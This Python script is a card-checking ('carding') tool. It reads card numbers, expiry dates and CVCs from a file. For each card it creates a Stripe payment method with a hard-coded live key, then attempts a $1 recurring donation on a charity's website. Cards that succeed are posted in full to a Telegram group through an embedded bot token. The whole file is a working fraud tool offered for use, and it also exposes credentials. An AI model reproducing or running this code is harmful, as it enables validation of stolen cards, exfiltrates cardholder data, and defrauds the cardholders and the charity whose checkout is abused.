#!/usr/bin/env python3
"""
Command-line tool to check cards from TestCards.txt
"""

import requests
import time
import sys
import os

# Bot Configuration
BOT_TOKEN = "7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s"
GROUP_ID = "-1003538559040"
BOT_CREDIT = "@MissNullMe"

def send_to_group(message):
    """Send message to Telegram group"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': GROUP_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except:
        return False

def check_card(cc_combo):
    """Check a single card using mady gate"""
    try:
        parts = cc_combo.strip().split('|')
        if len(parts) != 4:
            return "error", "Invalid format"
        
        n, mm, yy, cvc = parts
        
        # Format year
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        
        mm = mm.zfill(2)
        
        # Step 1: Create Stripe PM
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&billing_details[name]=John+Doe&billing_details[email]=test@gmail.com&billing_details[address][line1]=Street+27&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=test123&muid=test456&sid=test789&payment_user_agent=stripe.js%2Ftest&referrer=https%3A%2F%2Fccfoundationorg.com&time_on_page=88364&key=pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', 
                                headers=headers, data=data, timeout=20)
        
        if response.status_code != 200:
            # Check for specific decline reasons
            if response.status_code == 402:
                try:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', '')
                    if 'Your card was declined' in error_msg:
                        return "declined", "Card declined"
                    elif 'Your card has insufficient funds' in error_msg:
                        return "declined", "Insufficient funds"
                    elif 'Your card\'s security code is incorrect' in error_msg:
                        return "approved", "CCN Live - Incorrect CVC"
                    else:
                        return "declined", error_msg[:50]
                except:
                    return "declined", f"HTTP {response.status_code}"
            return "error", f"HTTP {response.status_code}"
        
        pm_json = response.json()
        pm_id = pm_json.get('id')
        
        if not pm_id:
            error_msg = pm_json.get('error', {}).get('message', 'Unknown error')
            return "declined", error_msg[:50]
        
        # Step 2: Process donation
        headers2 = {
            'authority': 'ccfoundationorg.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://ccfoundationorg.com',
            'referer': 'https://ccfoundationorg.com/donate/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data2 = {
            'charitable_form_id': '69433fc4b65ac',
            '_charitable_donation_nonce': '49c3e28b2a',
            '_wp_http_referer': '/donate/',
            'campaign_id': '988003',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'recurring_donation': 'month',
            'first_name': 'John',
            'last_name': 'Doe',
            'email': 'test@gmail.com',
            'address': 'Street 27',
            'postcode': '10080',
            'gateway': 'stripe',
            'stripe_payment_method': pm_id,
            'action': 'make_donation',
        }
        
        response2 = requests.post('https://ccfoundationorg.com/wp-admin/admin-ajax.php',
                                 headers=headers2, data=data2, timeout=30)
        
        msg = response2.text
        
        if 'requires_action' in msg or 'successed' in msg or 'Thank you' in msg:
            return "approved", "Charged Successfully"
        else:
            return "declined", "Payment declined"
            
    except Exception as e:
        return "error", str(e)[:50]

def main():
    file_path = "/home/null/Desktop/TestCards.txt"
    
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
    
    print(f"📁 Reading cards from: {file_path}")
    
    if not os.path.exists(file_path):
        print(f"❌ File not found: {file_path}")
        return
    
    with open(file_path, 'r') as f:
        lines = f.readlines()
    
    cards = [line.strip() for line in lines if line.strip() and '|' in line]
    
    print(f"✅ Found {len(cards)} cards")
    print("⏳ Starting check...\n")
    
    approved = 0
    declined = 0
    errors = 0
    
    for idx, card in enumerate(cards, 1):
        print(f"[{idx}/{len(cards)}] Checking: {card[:6]}******{card[-4:]}", end=" ... ")
        
        status, result = check_card(card)
        
        if status == "approved":
            approved += 1
            print(f"✅ APPROVED - {result}")
            
            # Post to group
            message = f"""
✅✅ <b>APPROVED CARD</b> ✅✅

<b>Card:</b> <code>{card}</code>
<b>Gateway:</b> Mady Gate ($1 USD)
<b>Response:</b> {result} 🟢

<b>Checked via:</b> Command Line
<b>Bot by:</b> {BOT_CREDIT}
"""
            send_to_group(message)
            
        elif status == "declined":
            declined += 1
            print(f"❌ DECLINED - {result}")
        else:
            errors += 1
            print(f"⚠️ ERROR - {result}")
        
        # Rate limiting
        time.sleep(2.5)
        
        # Progress update every 10 cards
        if idx % 10 == 0:
            print(f"\n📊 Progress: ✅ {approved} | ❌ {declined} | ⚠️ {errors}\n")
    
    print("\n" + "="*50)
    print("🎉 COMPLETE!")
    print(f"✅ Approved: {approved}")
    print(f"❌ Declined: {declined}")
    print(f"⚠️ Errors: {errors}")
    print(f"📁 Total: {len(cards)}")
    print("="*50)

if __name__ == "__main__":
    main()
